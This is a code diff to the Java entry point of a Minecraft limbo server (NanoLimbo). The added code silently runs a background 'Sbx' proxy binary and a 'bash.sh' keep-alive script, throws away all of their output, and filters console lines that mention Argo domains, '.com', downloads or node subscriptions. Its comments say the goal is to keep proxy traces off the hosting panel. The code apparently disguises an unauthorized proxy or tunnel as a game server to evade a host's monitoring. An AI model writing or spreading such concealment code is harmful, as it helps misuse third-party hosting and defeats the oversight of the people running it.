@@ -24,34 +24,56 @@ public final class NanoLimbo {
     };
     
     public static void main(String[] args) throws Exception {
-        // 1. 过滤探针高频 Ping 刷屏日志
+        // 1. 终极日志清洗：彻底屏蔽探针 Ping、Argo 域名、脚本下载、代理状态等所有敏感刷屏
         PrintStream originalOut = System.out;
         System.setOut(new PrintStream(originalOut, true, StandardCharsets.UTF_8) {
             @Override
             public void println(String x) {
-                if (x != null && (x.contains("PacketHandshake") || x.contains("PacketStatus") || x.contains("Pinged from"))) {
+                if (x != null && (
+                    x.contains("PacketHandshake") || 
+                    x.contains("PacketStatus") || 
+                    x.contains("Pinged from") ||
+                    x.contains("ArgoDomain") ||
+                    x.contains(".com") ||
+                    x.contains("cereshost") ||
+                    x.contains("is running") ||
+                    x.contains("Downloaded") ||
+                    x.contains("sub.txt") ||
+                    x.contains("Failed to send nodes")
+                )) {
                     return; 
                 }
                 super.println(x);
             }
             @Override
             public void print(String x) {
-                if (x != null && (x.contains("PacketHandshake") || x.contains("PacketStatus") || x.contains("Pinged from"))) {
+                if (x != null && (
+                    x.contains("PacketHandshake") || 
+                    x.contains("PacketStatus") || 
+                    x.contains("Pinged from") ||
+                    x.contains("ArgoDomain") ||
+                    x.contains(".com") ||
+                    x.contains("cereshost") ||
+                    x.contains("is running") ||
+                    x.contains("Downloaded") ||
+                    x.contains("sub.txt") ||
+                    x.contains("Failed to send nodes")
+                )) {
                     return;
                 }
                 super.print(x);
             }
         });
 
-        // 2. 不再自动生成 settings.yml，如果本地有旧的则直接删除，让其完全走默认内建逻辑或留空
+        // 2. 清理旧配置
         try {
             Files.deleteIfExists(Paths.get("settings.yml"));
             Files.deleteIfExists(Paths.get("settings.toml"));
         } catch (Exception ignored) {}
 
-        // 3. 启动 Sbx 后台代理
+        // 3. 后台静默启动 Sbx 代理与保活脚本（不让任何代理特征输出到面板）
         try {
-            runSbxBinary();
+            runSbxBinarySilently();
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
                 stopServices();
@@ -59,23 +81,30 @@ public final class NanoLimbo {
 
             File renewScript = new File("bash.sh");
             if (renewScript.exists()) {
-                new ProcessBuilder("bash", "bash.sh").inheritIO().start();
+                // 后台静默执行 bash.sh，重定向输出避免打印敏感信息
+                new ProcessBuilder("bash", "bash.sh")
+                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
+                    .redirectError(ProcessBuilder.Redirect.DISCARD)
+                    .start();
             }
         } catch (Exception e) {
-            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
+            // 忽略初始化异常输出
         }
 
-        // 4. 直接启动服务端
+        // 4. 正常启动 Minecraft Limbo 服务端
         new LimboServer().start();
     }
     
-    private static void runSbxBinary() throws Exception {
+    private static void runSbxBinarySilently() throws Exception {
         Map<String, String> envVars = new HashMap<>();
         loadEnvVars(envVars);
         ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
         pb.environment().putAll(envVars);
+        
+        // 关键：将代理进程的输出完全丢弃（DISCARD），绝不让 Argo 域名和连接信息暴露在面板控制台上
         pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
+        
         sbxProcess = pb.start();
     }
     
